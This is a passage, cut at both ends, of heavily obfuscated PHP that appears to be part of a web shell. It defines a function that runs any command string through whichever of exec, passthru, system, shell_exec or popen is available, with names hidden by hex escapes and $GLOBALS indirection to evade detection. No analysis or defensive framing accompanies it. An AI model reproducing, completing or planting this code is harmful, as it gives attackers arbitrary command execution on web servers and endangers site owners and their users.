\x70\x6f\x73i\x78\x5f\x67\x65t\x70wu\x69\x64")===false)){function posix_getpwuid($p){return false;}}if(!function_exists("\x70osi\x78_get\x67\x72\x67id")&&(strpos($GLOBALS["\x64is\x61b\x6ce_\x66\x75\x6ect\x69o\x6e\x73"],"p\x6fs\x69x\x5fg\x65\x74grgid")===false)){function posix_getgrgid($p){return false;}}function ex($in){${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6b\x75x\x67\x67\x64f\x65\x78\x65"]}="";${"GLO\x42\x41\x4c\x53"}["\x77\x79i\x72\x65\x63"]="\x6fut";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x66\x6d\x68\x73gtq\x70d\x62\x6f"]="f";if(function_exists("e\x78ec")){${"\x47\x4cO\x42\x41\x4c\x53"}["\x65\x71n\x64\x6e\x68qty"]="o\x75\x74";${"G\x4c\x4fBA\x4c\x53"}["\x66ak\x79\x72q\x73\x62i"]="\x69\x6e";@exec(${${"G\x4c\x4f\x42ALS"}["\x66ak\x79\x72qsbi"]},${${"\x47LOB\x41L\x53"}["k\x75\x78g\x67\x64\x66\x65\x78e"]});${${"GL\x4f\x42\x41\x4c\x53"}["\x6b\x75\x78\x67\x67\x64\x66\x65\x78\x65"]}=@join("\n",${${"G\x4cO\x42\x41\x4cS"}["\x65\x71\x6edn\x68\x71t\x79"]});}elseif(function_exists("\x70a\x73\x73\x74h\x72\x75")){ob_start();@passthru(${${"GL\x4f\x42ALS"}["\x6e\x72l\x78a\x67\x67\x65\x73m"]});${${"G\x4cO\x42A\x4cS"}["\x6b\x75\x78\x67g\x64\x66\x65x\x65"]}=ob_get_clean();}elseif(function_exists("\x73y\x73t\x65\x6d")){$iocetgoal="i\x6e";ob_start();@system(${$iocetgoal});${${"GL\x4f\x42\x41\x4cS"}["\x6b\x75\x78\x67g\x64f\x65\x78e"]}=ob_get_clean();}elseif(function_exists("\x73he\x6cl\x5f\x65\x78\x65c")){$qxgtsjnljnij="o\x75t";${"G\x4cO\x42\x41\x4cS"}["c\x73\x78\x67x\x6b\x61n"]="\x69n";${$qxgtsjnljnij}=shell_exec(${${"\x47LO\x42\x41LS"}["\x63\x73x\x67\x78\x6ba\x6e"]});}elseif(is_resource(${${"G\x4c\x4fB\x41LS"}["\x66\x6d\x68\x73\x67\x74\x71pd\x62o"]}=@popen(${${"\x47LO\x42\x41\x4cS"}["\x6e\x72l\x78\x61\x67\x67e\x73m"]},"\x72"))){$sncutdz="f";${"G\x4c\x4fBALS"}["\x7ary\x6bz\x74r\x70b"]="\x6f\x75t";${${"G\x4c\x4f\x42\x41L\x53"}["ku\x78g\x67d\x66e\x78\x65"]}="";while(!@feof(${$sncutdz}))${${"G\x4c\x4fBA\x4c\x53"}["\x7a\x72y\x6b\x7atrp\x62"]}.=fread(${${"\x47\x4c\x4f\x42A\x4c\x53"}["o\x6d\x6f\x